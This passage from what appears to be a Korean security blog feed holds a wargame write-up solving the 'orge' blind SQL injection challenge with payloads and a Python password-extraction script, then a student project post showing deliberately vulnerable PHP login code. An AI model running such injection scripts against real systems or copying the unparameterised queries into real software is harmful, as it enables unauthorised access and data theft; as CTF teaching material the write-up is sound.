class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orge&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orge&quot;</span>);</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>, <code>or</code>, <code>and</code> 문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="3-줄-5-줄-해석"><a href="#3-줄-5-줄-해석" class="headerlink" title="3 줄 ~ 5 줄 해석"></a>3 줄 ~ 5 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 <code>id</code>에 guest가 고정으로 적혀있고 <code>pw</code>만 파라미터로 받고 있습니다.</p>
<p>마지막 줄 조건문을 보면 <code>result[&#39;id&#39;]</code>에 값이 있으면(참)이면 Hello {result[id]} 가 출력 됩니다.</p>
<br>

<br>

<h2 id="7-줄-해석"><a href="#7-줄-해석" class="headerlink" title="7 줄 해석"></a>7 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="8-줄-10-줄-해석"><a href="#8-줄-10-줄-해석" class="headerlink" title="8 줄 ~ 10 줄 해석"></a>8 줄 ~ 10 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orge where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orge&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시킵니다. 이번에는 <code>id</code>가 admin으로 고정되어있습니다.</p>
<p><code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/orge/solve_1.png">

<br>

<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello guest가 출력되었습니다.</p>
<p>두번째 쿼리문을 실행시키려면 중간에 <code>addslashes</code>함수를 우회하고 <code>result[&#39;pw&#39;]</code> 값을 참으로 만들어줘야 합니다.</p>
<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=1&#39; || length(pw)=&#39;1</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p><code>?pw=1&#39; || substring(pw,1,1)=&#39;0</code><br>MySQL의 <code>substring</code> 함수를 사용하여 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
<br>

<blockquote>
<p><code>substring(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
</blockquote>
<br>

<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1&#x27; || &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw)=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;+&quot;</span>,length)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) = &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            flag=flag+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>?pw=1&#39; ||  </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올 때까지 <code>length</code>값을 1씩 더해 줍니다.</p>
<br>

<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orge/solve_2.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/orge/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/orge/solve_4.png">

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[프로젝트] Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성</title>
    <url>/2021/09/19/2021-09-19-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8_Wargame%20%EC%82%AC%EC%9D%B4%ED%8A%B8%20%EC%A0%9C%EC%9E%91%20%EB%B0%8F%20%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%20%EC%A7%84%EB%8B%A8%20%ED%9B%84%20%EB%B3%B4%EA%B3%A0%EC%84%9C%20%EC%9E%91%EC%84%B1/</url>
    <content><![CDATA[<h1 id="🧶-프로젝트-개요"><a href="#🧶-프로젝트-개요" class="headerlink" title="🧶 프로젝트 개요"></a>🧶 프로젝트 개요</h1><p><br>Web, Reversing, Forensic, System 등 여러 분야의 해킹 기법을 학습하고 연습할 수 있는 Wargame 홈페이지를 제작하였습니다.<br>또한 해당 홈페이지에 대하여 모의 해킹 진단(침투테스트)을 수행하여 보고서를 쓰고, 취약한 부분에 대하여는 Secure Coding을 통하여 보완하였습니다.</p>
<br>

<br>

<h2 id="해당-프로젝트를-한-이유"><a href="#해당-프로젝트를-한-이유" class="headerlink" title="해당 프로젝트를 한 이유?"></a>해당 프로젝트를 한 이유?</h2><p><br>직접 사이트를 만들어보면서 PHP에 대한 이해와 DB에 대한 이해를 할 수 있고, 직접 워게임 문제를 만들어보면서 다양한 해킹 기법을 공부할 수 있다고 생각되어 이 프로젝트를 하게 되었습니다.</p>
<br>

<br>

<h2 id="프로젝트-진행-기간-amp-일정"><a href="#프로젝트-진행-기간-amp-일정" class="headerlink" title="프로젝트 진행 기간 &amp; 일정"></a>프로젝트 진행 기간 &amp; 일정</h2><pre class="mermaid">
gantt

dateFormat  YYYY-MM-DD

section 진행 기간

워게임 사이트 제작 :done,  des1, 2021-06-22,2021-07-02

워게임 Web 문제 제작:active, des2, 2021-07-02,2021-07-20

게시판 제작 및 기능 구현:         des3, 2021-07-15,2021-07-23

게시판 모의해킹 보고서 작성:active, des4, 2021-07-23,2021-08-06

보고서 취합 및 시큐어 코딩:done, des5, 2021-08-03,2021-08-13

발표 준비 및 발표:     des6, 2021-08-10, 2021-08-19

</pre>

<br>

<p>프로젝트는 <code>2021년 6월 22일</code>부터 <code>2021년 8월 19일</code>까지 진행되었으며 총 <code>8주차</code> 진행하였습니다.</p>
<p><code>0 ~ 1.5</code>주차 : 워게임 사이트 제작 및 기능 구현을 하였습니다.</p>
<p><code>1.5 ~ 4</code>주차 : 워게임 Web 문제를 제작하였습니다.</p>
<p><code>3.2 ~ 4.2</code>주차 : 게시판 제작 및 기능 구현을 하였습니다.</p>
<p><code>4.3 ~ 6.5</code>주차 : 게시판 모의해킹 및 보고서를 작성하였습니다.</p>
<p><code>6 ~ 7.2</code>주차 : 팀원 별로 작성한 보고서를 취합하고 시큐어 코딩을 했습니다.</p>
<p><code>7 ~ 8</code>주차 : 발표 준비 및 발표를 하였습니다.</p>
<br>

<br>

<h2 id="프로젝트-진행-환경"><a href="#프로젝트-진행-환경" class="headerlink" title="프로젝트 진행 환경"></a>프로젝트 진행 환경</h2><p><br><div class="note default"><h3 id="운영체제-amp-가상화"><a href="#운영체제-amp-가상화" class="headerlink" title="운영체제 &amp; 가상화"></a>운영체제 &amp; 가상화</h3><p>APM 환경은 <code>AWS EC2 Ubuntu 20.04.2 LTS</code>에 구축하였습니다.<br>워게임 문제같은 경우에는 <code>Docker</code>를 사용하였습니다.<br>해당 사이트 모의 해킹에는 <code>Windows 10</code>과 <code>Kali</code>를 사용하였습니다.</p>
</div></p>
<br>

<div class="note default"><h3 id="도구"><a href="#도구" class="headerlink" title="도구"></a>도구</h3><p>코드를 작성하는 도구로는 <code>Putty</code>와 <code>Visual Studio Code</code>를 사용하였습니다.<br>로컬에서 작성한 코드를 서버로 옮기는 도구로는 <code>WinSCP</code>를 사용하였습니다.</p>
</div>

<br>

<div class="note default"><h3 id="프로그램"><a href="#프로그램" class="headerlink" title="프로그램"></a>프로그램</h3><p>모의해킹에 사용한 프로그램으로는 <code>WireShark</code>, <code>Burp Suite</code>, <code>Nmap</code>, <code>sqlmap</code>, <code>Nikto</code>, <code>WAFW00F</code>등을 사용하였습니다.</p>
</div>

<br>

<div class="note default"><h3 id="언어"><a href="#언어" class="headerlink" title="언어"></a>언어</h3><p>사용 언어로는 <code>PHP</code>, <code>HTML</code>, <code>CSS</code>, <code>MySQL</code>를 사용하였습니다.</p>
</div>

<br>

<br>

<h2 id="프로젝트-구성도"><a href="#프로젝트-구성도" class="headerlink" title="프로젝트 구성도"></a>프로젝트 구성도</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/diagram.svg">

<br>

<p>위 구성도와 같이 <code>AWS EC2</code>에 DB 서버인 <code>MySQL</code>과 <code>Apache Web Server</code>를 구축했습니다.</p>
<p>워게임 문제같은 경우에는 <code>Docker</code>에 구축하였습니다.</p>
<br>

<h3 id="왜-도커에-구축"><a href="#왜-도커에-구축" class="headerlink" title="왜 도커에 구축?"></a>왜 도커에 구축?</h3><p>워게임 문제같은 경우에는 문제 의도 상 취약하게 만들어야 합니다. 만약 같은 서버에서 서비스하게 되면 메인 시스템에 악영향을 끼치는 의도치 못한 상황이 발생할 수 있기 때문에 <code>Docker</code>에 구축하였습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🎈-워게임-사이트-제작-및-기능-구현"><a href="#🎈-워게임-사이트-제작-및-기능-구현" class="headerlink" title="🎈 워게임 사이트 제작 및 기능 구현"></a>🎈 워게임 사이트 제작 및 기능 구현</h1><br>

<h2 id="메인-페이지"><a href="#메인-페이지" class="headerlink" title="메인 페이지"></a>메인 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/main.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>메인 페이지입니다. 저희 팀 로고와 팀명이 있고 각 메뉴가 있습니다.</p>
</div>

<br>

<br>

<h2 id="회원가입-amp-로그인"><a href="#회원가입-amp-로그인" class="headerlink" title="회원가입 &amp; 로그인"></a>회원가입 &amp; 로그인</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/register.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/login.png"></div></div></div></p>
<br>

<div class="note default"><p>회원가입 페이지와 로그인 페이지입니다.</p>
<p>회원가입 페이지에는 <code>아이디</code>,<code>닉네임</code> 중복확인 버튼이 있고 <code>패스워드</code>를 입력하는 입력란이 있습니다.</p>
<p>로그인 페이지에는 <code>아이디</code>, <code>패스워드</code> 입력란이 있습니다.</p>
</div>

<br>

<br>

<h2 id="문제-풀이-페이지"><a href="#문제-풀이-페이지" class="headerlink" title="문제 풀이 페이지"></a>문제 풀이 페이지</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/challenges.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/challenges_2.png"></div></div></div></p>
<br>

<div class="note default"><p>워게임 문제 풀이 페이지입니다. 여러가지 카테고리가 있습니다.</p>
<p>프로젝트의 목표가 웹해킹이라서 다른 카테고리의 문제는 없습니다.</p>
</div>

<br>

<br>

<h2 id="랭킹-페이지"><a href="#랭킹-페이지" class="headerlink" title="랭킹 페이지"></a>랭킹 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/rank.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>랭킹 페이지 입니다. </p>
<p>문제 풀이에 따른 점수로 레벨과 순위가 공개됩니다.</p>
</div>

<br>

<br>

<h2 id="플래그-입력-페이지"><a href="#플래그-입력-페이지" class="headerlink" title="플래그 입력 페이지"></a>플래그 입력 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/auth.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>플래그 입력 페이지 입니다.</p>
<p>문제를 풀면 플래그가 나오는데 그 플래그를 입력하면 점수가 주어집니다.</p>
</div>

<br>

<br>

<h2 id="소개-amp-설명-페이지"><a href="#소개-amp-설명-페이지" class="headerlink" title="소개 &amp; 설명 페이지"></a>소개 &amp; 설명 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/about.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>저희 팀명 소개와 워게임 사이트 사용 방법을 적어놓은 페이지입니다.</p>
</div>

<br>

<br>

<h2 id="마이-페이지"><a href="#마이-페이지" class="headerlink" title="마이 페이지"></a>마이 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/mypage.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>마이 페이지 입니다.</p>
<p>닉네임을 바꿀 수 있습니다. 닉네임을 바꿀려면 현재 비밀번호를 입력해야합니다.</p>
<p>비밀번호 또한 바꿀 수 있습니다. 마찬가지로 현재 비밀번호를 입력해야합니다.</p>
</div>

<br>

<br>

<hr>
<br>

<h1 id="🙄-워게임-Web-문제-제작"><a href="#🙄-워게임-Web-문제-제작" class="headerlink" title="🙄 워게임 Web 문제 제작"></a>🙄 워게임 Web 문제 제작</h1><br>

<p>총 14문제를 만들었고 그 중에서 몇 문제만 적었습니다.</p>
<br>

<br>

<h2 id="간단한-SQL-Injection"><a href="#간단한-SQL-Injection" class="headerlink" title="간단한 SQL Injection"></a>간단한 SQL Injection</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/simple_sqli.png">

<br>

<p>위와 같이 간단한 로그인 폼이 있고, 간단한 SQLi로 풀 수 있는 문제입니다.</p>
<p><code>소스</code>와 <code>DB</code>는 아래와 같습니다.</p>
<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$pw</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from web1 where id=&#x27;<span class="subst">$id</span>&#x27; &amp;&amp; pw=&#x27;<span class="subst">$pw</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_fetch_array(mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>[2]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;login fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;php로그인&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form  method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      로그인&lt;/br&gt;</span><br><span class="line">      아이디 : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      비밀번호 : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pw&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;로그인&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#DataBase</span><br><span class="line"></span><br><span class="line">+-------+----------+-------------------+</span><br><span class="line">| id    | pw       | flag              |</span><br><span class="line">+-------+----------+-------------------+</span><br><span class="line">| admin | anything | flag&#123;Simpl3_Sq1i&#125; |</span><br><span class="line">+-------+----------+-------------------+</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="UNION-SQL-Injection"><a href="#UNION-SQL-Injection" class="headerlink" title="UNION SQL Injection"></a>UNION SQL Injection</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_1.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_2.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_3.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_4.png">

<br>

<p><code>첫번째</code> 사진은 로그인 페이지와 shop 페이지로 들어갈 수 있는 메인 페이지입니다.</p>
<p><code>두번째</code> 사진은 로그인 페이지로 들어왔을 때 보이는 로그인 폼 입니다.</p>
<p><code>세번째</code> 사진은 shop 페이지로 들어갔을 때 보이는 상품 목록 입니다.</p>
<p><code>네번째</code> 사진은 최종적으로 UNION SQL Injection을 성공했을 때 나온 사진입니다.</p>
<br>

<p><code>소스</code>와 <code>DB</code>는 아래와 같습니다.</p>
<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#메인 페이지입니다. index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;shop&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from book&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$i</span> = mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;shop.php?list=&quot;</span>.<span class="variable">$i</span>[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;ShopMainPage&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;&lt;a href=<span 